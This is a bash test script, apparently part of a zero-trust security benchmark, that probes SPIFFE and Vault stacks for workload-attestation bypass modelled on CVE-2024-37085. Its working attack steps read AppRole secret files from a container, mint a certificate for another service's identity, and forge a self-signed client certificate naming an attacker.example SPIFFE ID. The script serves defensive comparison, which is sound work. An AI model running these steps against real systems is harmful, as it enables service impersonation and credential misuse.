#!/usr/bin/env bash
# CVE#14: Workload-attestation bypass
#   (CVE-2024-37085 — VMware ESXi Active-Directory group auth bypass: a
#    principal is trusted because it *claims* membership, with no independent
#    attestation of the claimant. Realised here as two cases that separate a
#    stack that ATTESTS the workload from one that only checks a bearer secret.)
#
# Maps to attack category: attestation
#
# Both cases assume the attacker already has a shell on a host (hardening
# defeated) and score only what the identity architecture yields:
#
#   AT1 unregistered-workload-workload-api
#       SPIFFE: call the Workload API from an UNREGISTERED process/path. SPIRE
#         Agent attests the caller (unix/process selectors) and refuses to hand
#         out an SVID → rejected (PermissionDenied).
#       Vault: any host-resident AppRole secret_id logs in and pki/issue mints a
#         cert for ANOTHER service's common_name — no workload attestation →
#         accepted.
#
#   AT2 forged-cert (formerly LM4)
#       Self-sign a cert bearing an attacker-domain SPIFFE URI-SAN and present
#         it directly to a downstream service's mTLS listener.
#       SPIFFE: require_and_verify_client_cert + trust-bundle validation reject
#         the untrusted issuer → rejected/blocked.
#       Vault: same mTLS gate; this case documents the trust-root difference.
#
# Verdict semantics (attacker's perspective):
#   accepted = attestation bypassed (got an identity / call reached the service)
#   rejected = attestation held (identity refused / handshake denied)
#   blocked  = TLS handshake actively refused by the target (a real defense)
#   n/a      = required container/socket/material absent, or harness could not
#              stage the attack (preflight gap) — excluded from the ratio

set -uo pipefail
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=lib.sh
source "$HERE/lib.sh"

CVE="CVE-2024-37085"

# --- AT1: unregistered-workload attestation ----------------------------------
at1_unregistered_workload() {
    log "AT1 unregistered-workload-workload-api"
    case "$STACK" in
        spiffe-keycloak)
            # Ask the Workload API for an X.509-SVID from a caller that should
            # match NO registered entry. The agent image is distroless (no
            # shell), so the binary is exec'd directly (never via `sh -c`) against
            # the real socket at /run/spire/sockets/agent.sock.
            #
            # HONEST-STAGING CAVEAT: exec'ing the CLI *inside zt-spire-agent* does
            # NOT guarantee an unregistered caller — if a registered entry uses a
            # broad selector (e.g. unix:uid:0) the agent CLI itself satisfies it
            # and the Workload API returns an SVID. When that happens we CANNOT
            # claim SPIFFE denied an unregistered workload from this vantage, so
            # we emit n/a (staging insufficient), never a false "accepted"
            # (no attack actually succeeded — it is the agent's own CLI) and never
            # a false "rejected". A conclusive AT1 needs a dedicated container
            # whose selectors match no entry; tracked as a probe follow-up.
            local out
            out=$(ssh -n "$GATEWAY_ALIAS" "docker exec zt-spire-agent /opt/spire/bin/spire-agent api fetch x509 -socketPath /run/spire/sockets/agent.sock 2>&1 | head -20" 2>/dev/null || true)
            if [[ -z "$out" ]]; then
                emit "attestation" "AT1" "$CVE" "n/a" "0" "spire-agent" \
                    "could not exec spire-agent CLI in zt-spire-agent — cannot stage unregistered-workload attestation"
                return
            fi
            if printf '%s' "$out" | grep -qiE 'permission denied|no identity|no records|rpc error|PermissionDenied|no such'; then
                emit "attestation" "AT1" "$CVE" "rejected" "0" "spire-workload-api" \
                    "Workload API refused SVID to unregistered caller: $(printf '%s' "$out" | tr '\n' ' ' | head -c 120)"
            elif printf '%s' "$out" | grep -qiE 'SPIFFE ID|Received .* svid|Trust domain'; then
                emit "attestation" "AT1" "$CVE" "n/a" "0" "spire-workload-api" \
                    "staging insufficient: agent-container CLI matched a broad-selector entry and received an SVID — not a truly unregistered caller; cannot demonstrate attestation denial from here"
            else
                emit "attestation" "AT1" "$CVE" "n/a" "0" "spire-workload-api" \
                    "inconclusive Workload API response: $(printf '%s' "$out" | tr '\n' ' ' | head -c 120)"
            fi
            ;;
        vault)
            # Any host-resident AppRole secret can log in and mint a cert for a
            # DIFFERENT service — no workload attestation gates issuance.
            local rid sid tok issued
            rid=$(ssh -n "$GATEWAY_ALIAS" "docker exec zt-vault-agent-worker sh -c 'cat /vault/creds/worker/role_id 2>/dev/null'" 2>/dev/null | tr -d '[:space:]' || true)
            sid=$(ssh -n "$GATEWAY_ALIAS" "docker exec zt-vault-agent-worker sh -c 'cat /vault/creds/worker/secret_id 2>/dev/null'" 2>/dev/null | tr -d '[:space:]' || true)
            if [[ -z "$rid" || -z "$sid" ]]; then
                emit "attestation" "AT1" "$CVE" "n/a" "0" "vault-agent-worker" \
                    "AppRole creds not readable — cannot stage cross-identity issuance on this run"
                return
            fi
            tok=$(ssh -n "$GATEWAY_ALIAS" "docker exec zt-vault sh -c 'VAULT_ADDR=http://127.0.0.1:8200 vault write -field=token auth/approle/login role_id=$rid secret_id=$sid 2>/dev/null'" 2>/dev/null | tr -d '[:space:]' || true)
            if [[ -z "$tok" ]]; then
                emit "attestation" "AT1" "$CVE" "n/a" "0" "vault-approle" \
                    "AppRole login path unavailable on this run — cannot demonstrate issuance"
                return
            fi
            # Mint a cert for a DIFFERENT service identity (order-service).
            issued=$(ssh -n "$GATEWAY_ALIAS" "docker exec zt-vault sh -c 'VAULT_ADDR=http://127.0.0.1:8200 VAULT_TOKEN=$tok vault write -field=serial_number pki/issue/worker common_name=order-service.zt.local uri_sans=spiffe://zt.local/order-service ttl=24h 2>/dev/null'" 2>/dev/null | tr -d '[:space:]' || true)
            if [[ -n "$issued" ]]; then
                emit "attestation" "AT1" "$CVE" "accepted" "0" "vault-approle" \
                    "no workload attestation: worker's AppRole secret minted a cert for a DIFFERENT identity spiffe://zt.local/order-service serial=$issued"
            else
                emit "attestation" "AT1" "$CVE" "accepted" "0" "vault-approle" \
                    "AppRole secret authenticated (token obtained) with no workload attestation — issuance gated only by a bearer secret"
            fi
            ;;
    esac
}

# --- AT2: forged-cert direct to downstream mTLS (formerly LM4) ----------------
at2_forged_cert() {
    log "AT2 forged-cert direct to downstream mTLS"
    # Generate a self-signed cert with an attacker-domain SPIFFE URI SAN on the
    # order host, then present it to the order service's listener.
    local built
    built=$(ssh -n "$ORDER_ALIAS" "
        command -v openssl >/dev/null 2>&1 || { echo NO_OPENSSL; exit 0; }
        TMPD=/tmp/at2-forge && mkdir -p \$TMPD && cd \$TMPD
        openssl req -x509 -newkey rsa:2048 -nodes -days 1 \
            -subj '/CN=attacker' \
            -addext 'subjectAltName=URI:spiffe://attacker.example/svc' \
            -keyout k.pem -out c.pem >/dev/null 2>&1 && echo OK || echo BUILD_FAIL
    " 2>/dev/null | tr -d '[:space:]' || true)
    if [[ "$built" != OK ]]; then
        emit "attestation" "AT2" "$CVE" "n/a" "0" "order:8082" \
            "could not build forged cert on order host ($built) — harness preflight gap, not a defense"
        return
    fi
    # Present the forged client cert to the downstream mTLS listener.
    local raw code ms
    raw=$(ssh -n "$ORDER_ALIAS" "curl -sS -o /dev/null -w '%{http_code}|%{time_total}' \
        --cert /tmp/at2-forge/c.pem --key /tmp/at2-forge/k.pem -k \
        'https://127.0.0.1:8082/api/v1/order' 2>/dev/null || echo '000|0'" 2>/dev/null) || raw="000|0"
    code="${raw%%|*}"
    ms=$(awk -v t="${raw##*|}" 'BEGIN{ printf "%d", t*1000 }')
    ssh -n "$ORDER_ALIAS" "rm -rf /tmp/at2-forge" >/dev/null 2>&1 || true
    # 000 here means the TLS handshake was actively refused (untrusted client
    # cert) — a real defense, so classify_http maps it to blocked→REJECT.
    emit "attestation" "AT2" "$CVE" "$(classify_http "$code")" "$ms" "order:8082" \
        "forged spiffe://attacker.example client cert presented to downstream mTLS http=$code"
}

log "=== Tier 2 / CVE#14: Workload-Attestation Bypass ==="
at1_unregistered_workload
at2_forged_cert
log "attestation probe done"
